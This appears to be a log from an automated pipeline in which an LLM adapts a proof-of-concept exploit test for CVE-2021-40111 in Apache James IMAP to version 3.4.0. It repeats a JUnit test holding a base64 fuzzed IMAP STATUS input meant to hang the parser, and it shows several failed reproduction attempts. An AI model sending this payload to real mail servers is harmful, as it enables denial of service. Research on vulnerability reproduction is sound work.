Error: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super(statusResponseFactory); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.message.response.UnpooledStatusResponseFactory
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[Adapter] Related diffs for error: [(18, 1.0), (19, 1.0), (20, 1.0), (21, 1.0), (22, 1.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.message.response.UnpooledStatusResponseFactory'][0m
[96m[RepairModule] Trying best diff #18 with score 1.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #18 with score 1.00[0m
[LLMClient] Tokens used: 799 (prompt), 453 (completion), 1252 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super(statusResponseFactory);

### Related Diff:
Operation: MODIFIED, File: backends-common/cassandra/pom.xml, Hunk: @@ -24,7 +24,7 @@
     <parent>
         <groupId>org.apache.james</groupId>
         <artifactId>james-backends-common</artifactId>
+        <version>3.4.0</version>
-        <version>3.5.0</version>
     </parent>

     <artifactId>apache-james-backends-cassandra</artifactId>

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |', 'constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[92m[RepairModule] Error constructor StatusCommandParser in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: no arguments found: org.apache.james.imap.message.response.UnpooledStatusResponseFactory reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #18 at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1599 (prompt), 1 (completion), 1600 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
  required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
  found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.289 s
[INFO] Finished at: 2025-07-13T15:30:01Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2021-40111: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java:[39,14] method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types;
[ERROR]   required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession
[ERROR]   found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2021-40111</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.apache.james.protocols</groupId>
            <artifactId>protocols-imap</artifactId>
            <version>3.4.0</version>
        </dependency>
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.22.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 234 (prompt), 27 (completion), 261 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 39, 'column': 14, 'message': 'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        super.decode(request, tag, session);'} with cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'][0m
[LLMClient] Tokens used: 278 (prompt), 79 (completion), 357 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 3.4.0: 

Error: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 3.5.0 

Error code:         super.decode(request, tag, session); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.apache.james.imap.decode.parser.StatusCommandParser;org.apache.james.imap.decode.ImapRequestStreamLineReader;org.apache.james.imap.api.ImapCommand;org.apache.james.imap.decode.ImapRequestLineReader;org.apache.james.imap.api.process.ImapSession;org.apache.james.imap.encode.FakeImapSession
[96m[ErrorManager] Extracted key entities: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.decode.ImapRequestLineReader', 'org.apache.james.imap.api.process.ImapSession', 'org.apache.james.imap.encode.FakeImapSession'][0m
[96m[Adapter] Related diffs for error: [(4586, 2.0), (4960, 2.0), (4986, 2.0), (5041, 2.0), (5058, 2.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length | cause: ['org.apache.james.imap.decode.parser.StatusCommandParser', 'org.apache.james.imap.decode.ImapRequestStreamLineReader', 'org.apache.james.imap.api.ImapCommand', 'org.apache.james.imap.decode.ImapRequestLineReader', 'org.apache.james.imap.api.process.ImapSession', 'org.apache.james.imap.encode.FakeImapSession'][0m
[96m[RepairModule] Trying best diff #4586 with score 2.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(4586, 5041) with score 2.00[0m
[LLMClient] Tokens used: 1109 (prompt), 507 (completion), 1616 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully in 3.5.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.5.0 to 3.4.0.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        super.decode(request, tag, session);

### Related Diff:
Operation: MODIFIED, File: mpt/impl/imap-mailbox/core/src/main/java/org/apache/james/mpt/host/JamesImapHostSystem.java, Hunk: @@ -22,8 +22,11 @@
 import org.apache.commons.configuration2.HierarchicalConfiguration;
 import org.apache.commons.configuration2.ex.ConfigurationException;
 import org.apache.commons.configuration2.plist.PropertyListConfiguration;
-import org.apache.commons.configuration2.tree.ImmutableNode;
 import org.apache.james.adapter.mailbox.store.UserRepositoryAuthenticator;
 import org.apache.james.adapter.mailbox.store.UserRepositoryAuthorizator;
-import org.apache.james.core.Username;
-import org.apache.james.domainlist.api.DomainList;
 import org.apache.james.imap.api.ImapConfiguration;
 import org.apache.james.imap.api.process.ImapProcessor;
 import org.apache.james.imap.decode.ImapDecoder;
Operation: MODIFIED, File: protocols/imap/src/main/java/org/apache/james/imap/decode/parser/SearchCommandParser.java, Hunk: @@ -40,9 +39,9 @@
 import org.apache.james.imap.api.message.response.StatusResponse.ResponseCode;
 import org.apache.james.imap.api.message.response.StatusResponseFactory;
 import org.apache.james.imap.api.process.ImapSession;
-import org.apache.james.imap.decode.DecodingException;
 import org.apache.james.imap.decode.ImapRequestLineReader;
 import org.apache.james.imap.message.request.SearchRequest;
+import org.apache.james.protocols.imap.DecodingException;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;

### Test File Content:
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(request, tag, session);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Base64;

import org.apache.james.protocols.imap.DecodingException;
import org.apache.james.imap.decode.ImapRequestStreamLineReader;
import org.apache.james.imap.decode.parser.StatusCommandParser;
import org.apache.james.imap.encode.FakeImapSession;
import org.apache.james.imap.message.response.UnpooledStatusResponseFactory;
import org.junit.Test;

import java.nio.charset.StandardCharsets;
import org.apache.james.imap.api.ImapCommand;
import org.apache.james.imap.api.process.ImapSession;
import org.apache.james.imap.decode.ImapRequestLineReader;


public class Testcase1 {
    @Test(timeout = 1000)
    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);


        assertThatThrownBy(() -> new StatusCommandParserChild(new UnpooledStatusResponseFactory())
                .decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                        new ByteArrayOutputStream()), "AEA", new FakeImapSession()))
                .isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super();
    }

    public void decode(ImapRequestStreamLineReader request, String tag, FakeImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[RepairModule] Old grouped keys: {'method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: set()
[92m[RepairModule] Error method decode in class org.apache.james.imap.decode.parser.StatusCommandParser cannot be applied to given types; required: org.apache.james.imap.api.ImapCommand,org.apache.james.imap.decode.ImapRequestLineReader,java.lang.String,org.apache.james.imap.api.process.ImapSession found: org.apache.james.imap.decode.ImapRequestStreamLineReader,java.lang.String,org.apache.james.imap.encode.FakeImapSession reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(4586, 5041) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1294 (prompt), 1 (completion), 1295 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 3.4.0:org.apache.james.protocols:protocols-imap.
This test file compiles and runs successfully with version 3.5.0.

Your task is to:
1. Analyze why this issue occurs with the *3.5.0* but not with the *3.4.0 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2021-40111 >--------------------
[INFO] Building CVE-2021-40111 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2021-40111 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2021-40111 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2021-40111 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2021-40111 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
